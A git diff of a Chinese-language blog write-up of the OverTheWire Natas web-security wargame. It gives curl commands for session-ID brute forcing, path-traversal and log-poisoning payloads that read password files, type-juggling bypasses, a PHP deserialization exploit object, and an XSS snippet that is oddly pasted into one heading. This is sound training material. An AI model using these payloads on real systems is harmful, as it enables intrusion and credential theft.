@@ -6,7 +6,7 @@ categories:
 tags:
 - C++
 ---
-//Description:
+//Description: overthewire 上的练习，学习web-security
 
 //Create Date: 2020-02-24 10:53:23
 
@@ -16,19 +16,21 @@ tags:
 
 [address](https://overthewire.org/wargames/natas/)
 
-[reference1-26](https://www.cnblogs.com/ichunqiu/p/9554885.html)
+[reference](https://blog.csdn.net/winkar/article/details/38620401)
 
-[reference11-20](https://zhuanlan.zhihu.com/p/45702581)
+[reference1-26](https://www.cnblogs.com/ichunqiu/p/9554885.html)
 
 ## 1. <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
 
 ![natas1](./natas/natas1.png)
 
-## 2. <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+## 2. （常用的查看源码方法：右键查看、F12查看元素，给页面url前加’view-source:’查看，使用Linux Curl命令查看）
+
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 
 ![natas2](./natas/natas2.png)
 
-## 3.
+## 3. 同目录权限问题，水平越权
 
 ```
 # username:password
@@ -57,7 +59,7 @@ Disallow: /s3cr3t/
 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ```
 
-## 5. 
+## 5. curl命令
 
 ```
 C:\Users\channy>curl -isu natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"
@@ -161,7 +163,7 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 ```
 
-## 8. http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+## 8> https://www.segmentfault.com<img src="x" onerror="alert(1)">. http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
 ```
 <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
@@ -200,6 +202,7 @@ if(array_key_exists("submit", $_POST)) {
 <?php
 echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
 ?>
+```
 
 得secret: oubWYf2kBq
 
@@ -768,6 +771,16 @@ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
 通过BurpSuite-Intruder Attack模块设置字典1-640进行暴力破解
 
+```sh
+#!/bin/sh
+
+for i in `seq 640` 
+do
+    echo $i
+    curl -isu natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/  --cookie "PHPSESSID=$i" | grep natas19
+done
+```
+
 当PHPSESSID=138时，获得natas19密码
 
 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
@@ -775,6 +788,27 @@ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ## 20.
 
 随便输入username和password，抓包观察PHPSESSID，发现是输入的信息，按照password-username的格式，由ascill码转化为16进制，猜测正确PHPSESSID，应该是id-admin，用python构造字典，burp抓包后使用intruder模块，导入字典后进行暴力破解。
+
+```sh
+#!/bin/sh
+
+#for i in `seq 37 39`
+#do
+    #for j in `seq 30 39`
+    #do
+        #for k in `seq 30 39`
+        #do
+            #echo $i  $j  $k
+
+            i=35
+            j=30
+            k=31
+            #echo "PHPSESSID=${i}${j}${k}2d61646d696e"
+            curl -isu  natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org --cookie "PHPSESSID=${i}${j}${k}2d61646d696e" | grep -A 3 "natas20"
+        #done
+    #done
+#done
+```
 
 当PHPSESSID=38392d61646d696e时，得到key。
 Key：eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
@@ -784,12 +818,141 @@ Key：eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 由于服务端对sessionID进行了合法性校验，因此无法直接通过修改PHPSESSID来读取密码文件的信息
 但username没有任何校验，因此可以在其中注入\nadmin 1使读取的时候对Session进行间接篡改
 
+```sh
+curl -isu natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF http://natas20.natas.labs.overthewire.org -d "name=head > admin 1"
+```
 
 IFekPyrQXftziDEsUr3x21sYuahypdgJ
 
 ## 22.
 
-放弃。。。
+```source code
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+```
+
+```
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+```
+
+```sh
+curl -isu natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org -d "submit=update" -d "admin=1"
+```
+
+得PHPSESSID=ia4mr6isorpqdhltm0nli58or1
+
+同上一题得
+
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+23. 
+
+```sh
+curl -isu natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org?revelio=1
+```
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+```
+
+24. 一要求提交的参数中含有iloveyou，二要求它大于10.考验的是php的字符串向数字的转换规则，即截取最前几个数字，舍去不符合格式的部分。
+
+```source code
+if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+```
+
+```sh
+curl -isu natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org -F "passwd=11iloveyou"
+
+...
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+25. strcmp无法比较数组
+
+```
+if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+```
+
+```sh
+curl -isu natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg http://natas24.natas.labs.overthewire.org -F "passwd[]=1"
+
+...
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</pre> 
+```
+
+26. if是一次性把所有符合的替换掉，构造复合的参数即可绕过，例如：....//、..././。
+
+```
+curl -isu natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c natas25.natas.labs.overthewire.org -d "lang=..././..././..././..././..././tmp/natas25_6u790jr22d4ou5ilfmv4gh2423.log"  --user-agent "<?passthru(\"cat /etc/natas_webpass/natas26\")?>"
+
+...
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+```
+
+27. php反序列化漏洞、代码审计
+
+```
+<?php
+class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+        function __construct(){   #注入信息
+            $this->initMsg="";
+            $this->exitMsg="<?echo include '/etc/natas_webpass/natas27';?>";
+            $this->logFile="img/aaa.php";
+        }
+}
+ 
+$test = new Logger();
+echo serialize($test);
+echo "\n";
+echo base64_encode(serialize($test));    #显示base64编码后的序列化字符串
+?>
+```
+
+本地执行，得到base64编码后的序列化字符串：
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL2FhYS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo0NjoiPD9lY2hvIGluY2x1ZGUgJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jzs/PiI7fQ==
+把字符串覆盖到cookie[drawing]中，访问../img/aaa.php即可得到key。
+Key:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+28. 
+
 
 [back](/)
 
